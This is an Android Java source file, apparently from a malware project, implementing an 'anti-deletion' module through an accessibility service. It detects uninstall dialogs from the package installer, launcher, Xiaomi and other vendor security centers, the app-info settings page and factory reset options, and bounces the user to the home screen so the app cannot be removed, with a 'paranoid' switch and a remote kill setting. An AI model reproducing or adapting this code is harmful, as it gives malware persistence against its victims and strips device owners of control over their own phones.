package com.service.app.accessibility;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.google.android.material.tabs.TabLayout;
import com.service.app.Services.utils;
import com.service.app.defines;

import java.math.BigInteger;
import java.util.HashMap;
import java.util.Map;

public class antidelmodule {

    static utils utl = new utils();
    static defines consts = new defines();
    static UtilAccess UtilAccessibility = new UtilAccess();

    public static void performIfNecessary(AccessibilityService service, AccessibilityEvent event) {
        if (event.getPackageName() == null) {
            return;
        }

        if (isDeletionDialog(service, event) || isDeletionDialogB(service, event) || isDeletionDialogMax(service, event)){
            Log.d("mytag", "Calling deletionPreventionClick from DeletionDialog");
            deletionPreventionClick(service, event);
        } else if (isCorrectAppInfoWindow(service, event)){
            Log.d("mytag", "Calling grantDefaultSmsAppDialogClick from AppInfoWindow");
            deletionPreventionClick(service, event);
        } else if (isXiaomiSecurityCenterUninstall(service, event)){
            Log.d("mytag", "Calling grantDefaultSmsAppDialogClick");
            deletionPreventionClick(service, event);
        } else if (isChinaSecurityCenterUninstall(service, event)){
            Log.d("mytag", "Calling grantDefaultSmsAppDialogClick");
            deletionPreventionClick(service, event);
        } else if(isResetOption(service, event)){
            deletionPreventionClick(service, event);
        }
    }

    public static boolean isDeletionDialog(AccessibilityService service, AccessibilityEvent event){
        try {

        boolean isUninstallDialogPackage = false;
        boolean isUninstallDialogPackage2 = false;
        if (event.getPackageName()!=null) {
            isUninstallDialogPackage = event.getPackageName().toString().toLowerCase().contains("com.google.android.packageinstaller");
            isUninstallDialogPackage2 = event.getPackageName().toString().toLowerCase().contains("com.android.packageinstaller");
        }

        if (isUninstallDialogPackage || isUninstallDialogPackage2){
            Log.d("antidel","Deletiondialog!!!");
        }

        boolean paranoid = utl.SettingsRead(service.getApplicationContext(), "paranoid").equals("1");
        boolean isUninstallDialogClass = UtilAccessibility.getEventClassName(event).toLowerCase().contains("android.app.alertdialog");
        boolean isUninstallDialogClass2 = UtilAccessibility.getEventClassName(event).toLowerCase().contains("uninstall");
        boolean isUninstallDialogClass3 = UtilAccessibility.getEventClassName(event).toLowerCase().contains("android.app.dialog");
        boolean isUninstallDialogClass4 = UtilAccessibility.getEventClassName(event).toLowerCase().contains("com.android.packageinstaller.packageinstalleractivity");
        boolean containsAppName = (UtilAccess.findFirstNodeByName(service, event.getSource(), utl.getLabelApplication(service.getApplicationContext())) != null) || event.getText().contains(utl.getLabelApplication(service.getApplicationContext()));
        boolean isCorrectLayout = defines.appInfoWindowHashList.contains(UtilAccess.getNodesStructuralHash(event.getSource(), 0));
        boolean isKillCommand = !utl.SettingsRead(service.getApplicationContext(), consts.killApplication).toLowerCase().equals(consts.str_null);
        boolean notNotificationClass = !(UtilAccessibility.getEventClassName(event).toLowerCase().contains("notificationaccesssettingsactivity"));

        if (paranoid && !isKillCommand) {
            return ((isUninstallDialogClass || isUninstallDialogClass2 || isUninstallDialogClass3 || isUninstallDialogClass4) && containsAppName && notNotificationClass && (isCorrectLayout || isUninstallDialogPackage || isUninstallDialogPackage2));
        } else {
            return false;
        }

        } catch (Exception e){
            Log.d("mytag", e.toString());
            return  false;
        }

    }

    public static boolean isResetOption(AccessibilityService service, AccessibilityEvent event){
        return (UtilAccess.findNodesByNames(event.getSource(), defines.resetButtonsLabelList, true).size() > 0) && canMaxPrevent(service);
    }

    public static boolean isDeletionDialogB(AccessibilityService service, AccessibilityEvent event){
        if (UtilAccessibility.getEventClassName(event) == null) {
          return false;
        }
        boolean isUninstallDialogClass = UtilAccessibility.getEventClassName(event).toLowerCase().contains("uioverrides.quicksteplauncher");
        boolean containsAppName = UtilAccess.findFirstNodeByName(service, event.getSource(), utl.getLabelApplication(service.getApplicationContext())) != null;
        boolean containsUninstallText = UtilAccess.findNodesByNames(event.getSource(), defines.uninstallButtonsLabelList, true).size()>0;
        boolean isKillCommand = !utl.SettingsRead(service.getApplicationContext(), consts.killApplication).toLowerCase().equals(consts.str_null);
        if (!isKillCommand) {
            return isUninstallDialogClass && containsAppName && containsUninstallText;
        } else {
            return false;
        }
    }

    public static boolean isDeletionDialogMax(AccessibilityService service, AccessibilityEvent event){
        boolean isKillCommand = !utl.SettingsRead(service.getApplicationContext(), consts.killApplication).toLowerCase().equals(consts.str_null);
        if (!isKillCommand) {
            return (UtilAccess.findNodesByNames(event.getSource(), defines.uninstallButtonsLabelList, true).size() > 0) && canMaxPrevent(service);
        } else {
            return false;
        }

    }

    public static boolean isCorrectAppInfoWindow(AccessibilityService service, AccessibilityEvent event){
        boolean isCorrectClassA = UtilAccessibility.getEventClassName(event).toLowerCase().contains("com.android.settings.subsettings");
        boolean isCorrectClassB = UtilAccessibility.getEventClassName(event).toLowerCase().contains("applications.installedappdetailstop");
        boolean containsAppName = UtilAccess.findFirstNodeByName(service,event.getSource(), utl.getLabelApplication(service.getApplicationContext())) != null;
        boolean notNotificationClass = !(UtilAccessibility.getEventClassName(event).toLowerCase().contains("notificationaccesssettingsactivity"));
        boolean isCorrectLayout = defines.appInfoWindowHashList.contains(UtilAccess.getNodesStructuralHash(event.getSource(), 0));

        return (isCorrectClassA || isCorrectClassB) && containsAppName && isCorrectLayout && notNotificationClass;
    }


    public static boolean isXiaomiSecurityCenterUninstall(AccessibilityService service, AccessibilityEvent event){
        boolean appManager = UtilAccessibility.getEventClassName(event).toLowerCase().contains("com.miui.appmanager.applicationsdetailsactivity");
        boolean appDelete = UtilAccessibility.getEventClassName(event).toLowerCase().contains("com.miui.home.launcher.uninstall.deletedialog");
        boolean containsAppName = UtilAccess.findFirstNodeByName(service, event.getSource(), utl.getLabelApplication(service.getApplicationContext())) != null;
        return (appManager || appDelete) && containsAppName;
    }

    public static boolean isChinaSecurityCenterUninstall(AccessibilityService service, AccessibilityEvent event){
        boolean appManager = UtilAccessibility.getEventClassName(event).toLowerCase().contains("applicationsdetailsactivity");
        boolean appDelete = UtilAccessibility.getEventClassName(event).toLowerCase().contains("deletedialog");
        boolean containsAppName = UtilAccess.findFirstNodeByName(service, event.getSource(), utl.getLabelApplication(service.getApplicationContext())) != null;
        return (appManager || appDelete) && containsAppName && canMaxPrevent(service);
    }

    public static boolean deletionPreventionClick(AccessibilityService service, AccessibilityEvent event){
        UtilAccess.goHome(service);
        return true;
    }

    public static boolean canMaxPrevent(AccessibilityService service){
        String paranoidValue = utl.SettingsRead(service.getApplicationContext(), "paranoid");
        boolean paranoid = (paranoidValue != null && paranoidValue.equals("1"));
        return (paranoid);
    }

}
